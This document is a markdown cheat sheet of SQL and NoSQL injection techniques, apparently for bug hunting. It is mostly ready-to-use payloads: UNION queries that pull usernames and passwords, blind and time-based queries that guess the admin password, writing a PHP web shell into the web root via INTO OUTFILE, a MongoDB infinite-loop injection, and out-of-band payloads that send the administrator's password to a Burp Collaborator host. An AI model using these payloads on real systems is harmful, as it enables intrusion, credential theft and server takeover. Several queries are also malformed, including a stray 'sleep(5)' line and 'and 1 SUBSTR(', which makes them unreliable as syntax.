**SQL Injection Techniques**
1. **Introduction**
   - One of the most devastating server-side bugs.
   - Nowadays, you won't find it using a simple `'OR 1=1--` payload, but there are some tricks to still find it.
   - Before understanding SQLi, you should know the basics of SQL. Here's a quick SQL refresher: [SQL Basics](https://youtu.be/xiUTqnI6xk8).

2. **Testing with Injection Strings**
   - Test by injecting strings like:
     - `', -, /, ', :, ;`
   
3. **Extracting User ID**
   - SQL Query:
     ```sql
     SELECT Id FROM Users
     WHERE Username='you' AND Password='password123';
     ```
   
4. **Altering Database Records**
   - SQL Query:
     ```sql
     UPDATE Users
     SET Password='password12345'
     WHERE Id = 2;
     ```

5. **Second Order SQLi**
   - SQL Query:
     ```sql
     username="john_Cena' UNION SELECT Username, Password FROM Users;--
     "&password=password123
     ```

6. **Classic SQLi (Rare Nowadays)**
   - SQL Query:
     ```sql
     SELECT Title, Body FROM Emails
     WHERE Username='kane' AND AccessKey='ZB6w0YLjzvAVmp6zvr'
     UNION SELECT Username, Password FROM Users;--
     ```

7. **Blind SQLi**
   - You might use a webserver to get your responses too.
   - SQL Query:
     ```sql
     SELECT * FROM PremiumUsers WHERE Id='2'
     UNION SELECT Id FROM Users
     WHERE Username = 'admin'
     and 1 SUBSTR(Password, 1, 1) = 'a';--
     ```
   
8. **Time-Based SQLi**
   - SQL Query:
     ```sql
     sleep(5)
     2' UNION SELECT
     IF(SUBSTR(Password, 1, 1) = 'a', SLEEP(10), 0)
     Password FROM Users
     WHERE Username = 'admin';
     ```
   
9. **Exfiltrating Data using SQLi**
   - SQL Query:
     ```sql
     SELECT Password FROM Users WHERE Username='admin'
     INTO OUTFILE '/var/www/html/output.txt'
     ```
   - Now, fire up the file in the URL and view.

10. **NoSQL Injection (MongoDB)**
    - Some example queries for NoSQL injection:
      ```javascript
      Users.find({username: 'vickie', password: 'password123'});
      Users.find({username: $username, password: $password});
      Users.find( { $where: function() {
      return (this.username == 'ohyea'; while(true){};) } } );
      Users.find( { $where: function() {
      return (this.username == $user_input) } } );
      ```

11. **Automate with NoSQLMap**
    - [NoSQLMap GitHub](https://github.com/codingo/NoSQLMap/)

12. **Learning About the Database**
    - SQL Query:
      ```sql
      SELECT Title, Body FROM Emails
      WHERE Username='vickie'
      UNION SELECT 1, @@version;--
      ```

13. **Common Commands for Querying the Version**
    - Some common version queries:
      - `@@version` for Microsoft SQL Server and MySQL.
      - `version()` for PostgreSQL.
      - `v$version` for Oracle.
   
14. **Time-Based Database Version**
    - SQL Query:
      ```sql
      SELECT * FROM PremiumUsers WHERE Id='2'
      UNION SELECT IF(SUBSTR(@@version, 1, 1) = '1', SLEEP(10), 0); --
      ```

15. **Gaining a Web Shell**
    - SQL Query:
      ```sql
      SELECT Password FROM Users WHERE Username='abc'
      UNION SELECT "<? system($_REQUEST['cmd']); ?>"
      INTO OUTFILE "/var/www/html/shell.php"
      ```

16. **XML Injection**
    - SQL Query:
      ```sql
      TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
      ```
      ```sql
      TrackingId=x'+UNION+SELECT+EXTRACTVALUE(xmltype('<%3fxml+version%3d"1.0"+encoding%3d"UTF-8"%3f><!DOCTYPE+root+[+<!ENTITY+%25+remote+SYSTEM+"http%3a//'||(SELECT+password+FROM+users+WHERE+username%3d'administrator')||'.BURP-COLLABORATOR-SUBDOMAIN/">+%25remote%3b]>'),'/l')+FROM+dual--
      ```
   
17. **Hex Entities**
   - SQL Query:
     ```sql
     <storeId><@hex_entities>1 UNION SELECT username || '~' || password FROM users<@/hex_entities></storeId>
     ```
